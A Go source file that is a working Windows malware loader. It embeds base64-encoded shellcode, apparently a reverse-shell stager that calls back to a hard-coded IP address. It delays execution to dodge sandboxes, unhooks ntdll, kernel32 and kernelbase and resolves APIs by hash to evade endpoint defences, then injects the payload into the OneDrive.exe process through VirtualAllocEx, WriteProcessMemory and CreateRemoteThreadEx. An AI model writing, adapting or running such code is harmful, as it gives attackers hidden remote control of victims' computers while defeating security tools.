package main

import (
	"crypto/sha1"
	"encoding/base64"
	"fmt"
	"github.com/mitchellh/go-ps"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

//const INJECTED_PROCESS_NAME = "\\??\\C:\\Windows\\System32\\werfault.exe"

//VirtualAllocEx
//WriteProcessMemory
//CreateRemoteThread

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")

	OpenProcess        = kernel32.NewProc("OpenProcess")
	VirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx   = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	//RtlCreateUserThread = ntdll.NewProc("RtlCreateUserThread")
	CloseHandle          = kernel32.NewProc("CloseHandle")
	CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")
)
var b64sc = "/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgVkiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABWzwKhbgkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"

const LARGE_NUMBER = 500000
const PAGE_READWRITE = 0x04

func unhook() {

	dlls := []string{string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
		string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
		string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
	}
	gabh.FullUnhook(dlls)
	//sha1(sleep)=c3ca5f787365eae0dea86250e27d476406956478
	sleep_ptr, _, err := gabh.DiskFuncPtr("kernel32.dll", "c3ca5f787365eae0dea86250e27d476406956478", str2sha1)
	if err != nil {
		fmt.Println(err)
		return
	}
	syscall.Syscall(uintptr(sleep_ptr), 1, 3000, 0, 0)
	//NtDelayExecution
	sleep1, _, err := gabh.MemFuncPtr("ntdll.dll", "84804f99e2c7ab8aee611d256a085cf4879c4be8", str2sha1)
	if err != nil {
		fmt.Println(err)
		return
	}
	times := -(3000 * 10000)
	syscall.Syscall(uintptr(sleep1), 2, 0, uintptr(unsafe.Pointer(&times)), 0)

}
func sleep() {
	for i := 0; i <= LARGE_NUMBER; i++ {
		for j := 2; j <= i/2; j++ {
			if i%j == 0 {
				break
			}
		}
	}
}
func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func getpid() int32 {
	processes, _ := ps.Processes()
	for _, process := range processes {
		if process.Executable() == "OneDrive.exe" {
			return int32(process.Pid())
		}
	}
	return 0
}

func main() {
	sleep()
	sc, _ := base64.StdEncoding.DecodeString(b64sc)
	unhook()

	targetProcess, _, _ := OpenProcess.Call(0x0002|0x0008|0x0020|0x0010|0x0400, 0, uintptr(getpid()))
	//oldProtect := PAGE_READWRITE
	remoteProcessBuffer, _, _ := VirtualAllocEx.Call(targetProcess, 0, uintptr(len(sc)), 0x3000, 0x40)
	//VirtualProtectEx.Call(remoteProcessBuffer, uintptr(len(sc)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, err := WriteProcessMemory.Call(targetProcess, remoteProcessBuffer, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
	if err != nil {
		fmt.Println("threadErr:", err)
	}
	_, _, err = CreateRemoteThreadEx.Call(targetProcess, 0, 0, remoteProcessBuffer, 0, 0, 0)
	if err != nil {
		fmt.Println("threadErr:", err)
	}

	CloseHandle.Call(targetProcess)
	CloseHandle.Call(remoteProcessBuffer)

}
